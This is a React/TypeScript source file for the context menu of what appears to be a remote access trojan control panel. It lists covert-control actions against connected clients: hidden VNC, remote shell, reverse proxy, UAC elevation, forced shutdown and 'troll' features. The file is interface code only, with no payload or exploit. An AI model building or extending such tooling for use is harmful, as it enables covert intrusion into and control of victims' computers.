import React, { useContext, useEffect, useState, useRef } from "react";
import { RATContext } from "../rat/RATContext";
import { ContextMenuProps, SubMenuProps } from "../../types";

export enum OptionType {
  WINDOW = "window",
  MODAL = "modal",
  FUNCTION = "function",
  FUNCTION_WITH_PARAM = "function_with_param",
}

import {
  manageClientCmd,
  handleSystemCommandCmd,
  handleElevateCmd,
} from "../rat/RATCommands";

import {
  IconSettings2,
  IconDeviceDesktopCog,
  IconDeviceDesktopPlus,
  IconPower,
  IconPlugConnected,
  IconFolder,
  IconTerminal2,
  IconCpu2,
  IconWorld,
  IconShieldUp,
  IconMessage2,
  IconRotate,
  IconLogout2,
  IconPlugConnectedX,
  IconPlug,
  IconShareplay,
  IconNetwork,
  IconChevronRight,
  IconMoodSing,
  IconChevronDown,
  IconLink,
} from "@tabler/icons-react";

const menuOptions = [
  {
    label: "Manage",
    icon: <IconSettings2 size={24} />,
    options: [
      {
        label: "Remote Desktop",
        type: "remote-desktop",
        icon: <IconShareplay size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "Hidden VNC",
        type: "hvnc",
        icon: <IconDeviceDesktopPlus size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "File Manager",
        type: "file-manager",
        icon: <IconFolder size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "Remote Shell",
        type: "remote-shell",
        icon: <IconTerminal2 size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "Reverse Proxy",
        type: "reverse-proxy",
        icon: <IconNetwork size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "Process Viewer",
        type: "process-viewer",
        icon: <IconCpu2 size={24} />,
        optionType: OptionType.WINDOW,
      },
      {
        label: "Visit Website",
        type: "visit-website",
        icon: <IconWorld size={24} />,
        optionType: OptionType.MODAL,
        modalId: "visit_website_modal",
      },
      {
        label: "Elevate (UAC)",
        type: "elevate-privileges",
        icon: <IconShieldUp size={24} />,
        optionType: OptionType.FUNCTION,
        function: handleElevateCmd,
      },
      {
        label: "MessageBox",
        type: "show-message-box",
        icon: <IconMessage2 size={24} />,
        optionType: OptionType.MODAL,
        modalId: "message_box_modal",
      },
    ],
  },
  {
    label: "Fun Stuff",
    icon: <IconMoodSing size={24} />,
    type: "troll",
    optionType: OptionType.WINDOW,
  },
  {
    label: "System",
    icon: <IconDeviceDesktopCog size={24} />,
    options: [
      {
        label: "Shutdown",
        icon: <IconPower size={24} />,
        run: "shutdown",
        optionType: OptionType.FUNCTION_WITH_PARAM,
        function: handleSystemCommandCmd,
      },
      {
        label: "Reboot",
        icon: <IconRotate size={24} />,
        run: "reboot",
        optionType: OptionType.FUNCTION_WITH_PARAM,
        function: handleSystemCommandCmd,
      },
      {
        label: "Log Out",
        icon: <IconLogout2 size={24} />,
        run: "logout",
        optionType: OptionType.FUNCTION_WITH_PARAM,
        function: handleSystemCommandCmd,
      },
    ],
  },
  {
    label: "Connection",
    icon: <IconPlugConnected size={24} />,
    options: [
      {
        label: "Reconnect",
        icon: <IconPlug size={24} />,
        run: "reconnect",
        optionType: OptionType.FUNCTION_WITH_PARAM,
        function: manageClientCmd,
      },
      {
        label: "Disconnect",
        icon: <IconPlugConnectedX size={24} />,
        run: "disconnect",
        optionType: OptionType.FUNCTION_WITH_PARAM,
        function: manageClientCmd,
      },
    ],
  },
];

const SubMenu: React.FC<SubMenuProps> = ({
  items,
  top,
  left,
  addr,
  clientFullName,
  onClose,
}) => {
  const { openClientWindow } = useContext(RATContext)!;

  const handleOptionClick = (item: any) => {
    switch (item.optionType) {
      case OptionType.WINDOW:
        if (item.type) {
          openClientWindow(addr, item.type, clientFullName);
        }
        break;
      case OptionType.MODAL:
        if (item.modalId) {
          (
            document.getElementById(item.modalId) as HTMLDialogElement
          )?.showModal();
        }
        break;
      case OptionType.FUNCTION:
        if (typeof item.function === "function") {
          item.function(String(addr));
        }
        break;
      case OptionType.FUNCTION_WITH_PARAM:
        if (typeof item.function === "function" && item.run) {
          item.function(String(addr), item.run);
        }
        break;
    }
    onClose();
  };

  return (
    <div
      style={{ top: `${top}px`, left: `${left + 2}px` }}
      className="context-menu fixed shadow-lg border border-accentx rounded-md list-none flex flex-col text-center bg-primarybg text-white z-50"
    >
      {items.map((item, index) => {
        const isLast = index === items.length - 1;

        return (
          <div
            key={index}
            onClick={() => handleOptionClick(item)}
            className={`context-menu flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accentx transition-all ${
              isLast ? "" : "border-b border-accentx "
            }`}
          >
            {item.icon}
            {item.label}
          </div>
        );
      })}
    </div>
  );
};

export const ContextMenu: React.FC<ContextMenuProps> = ({
  x,
  y,
  addr,
  onClose,
  clientFullName,
}) => {
  const { openClientWindow } = useContext(RATContext)!;
  const { setSelectedClient } = useContext(RATContext)!;
  const [activeIndex, setActiveIndex] = useState<number | null>(null);
  const [submenuPosition, setSubmenuPosition] = useState({ top: 0, left: 0 });
  const menuRef = useRef<HTMLDivElement>(null);
  const submenuRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    setSelectedClient(clientFullName);
  }, [clientFullName]);

  const handleMouseEnter = (
    index: number,
    event: React.MouseEvent<HTMLDivElement, MouseEvent>
  ) => {
    setActiveIndex(index);
    const rect = event.currentTarget.getBoundingClientRect();
    setSubmenuPosition({ top: rect.top, left: rect.right });
  };

  // Add an effect to handle clicks outside of the menu
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        menuRef.current &&
        !menuRef.current.contains(event.target as Node) &&
        submenuRef.current &&
        !submenuRef.current.contains(event.target as Node)
      ) {
        setActiveIndex(null);
      }
    };

    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, []);

  // Close submenu when mouse leaves the menu area
  const handleMouseLeave = () => {
    // Use a small timeout to allow the mouse to move from main menu to submenu
    setTimeout(() => {
      const isOverSubMenu =
        submenuRef.current && submenuRef.current.matches(":hover");

      const isOverMainMenu =
        menuRef.current && menuRef.current.matches(":hover");

      if (!isOverSubMenu && !isOverMainMenu) {
        setActiveIndex(null);
      }
    }, 50);
  };

  return (
    <>
      <div
        ref={menuRef}
        className="fixed context-menu bg-primarybg border border-accentx rounded-md list-none flex flex-col text-center text-white z-50"
        style={{
          top: `${y}px`,
          left: `${x}px`,
        }}
        onMouseLeave={handleMouseLeave}
      >
        {menuOptions.map((option, index) => {
          const isLast = index === menuOptions.length - 1;

          return (
            <div
              key={index}
              className={`flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accentx transition-all ${
                isLast ? "" : "border-b border-accentx"
              }`}
              onClick={() => {
                if (option.optionType === OptionType.WINDOW) {
                  openClientWindow(addr, option.type, clientFullName);
                  onClose();
                }
              }}
              onMouseEnter={(e) => handleMouseEnter(index, e)}
            >
              {option.icon}
              {option.label}
              {option.options && activeIndex === index ? (
                <IconChevronRight size={24} className="ml-auto" />
              ) : option.options ? (
                <IconChevronDown size={24} className="ml-auto" />
              ) : (
                <IconLink size={24} className="ml-auto" />
              )}
            </div>
          );
        })}
      </div>
      {activeIndex !== null && menuOptions[activeIndex].options && (
        <div ref={submenuRef} onMouseLeave={handleMouseLeave}>
          <SubMenu
            items={menuOptions[activeIndex].options!}
            top={submenuPosition.top}
            left={submenuPosition.left}
            addr={addr}
            clientFullName={clientFullName}
            onClose={onClose}
          />
        </div>
      )}
    </>
  );
};
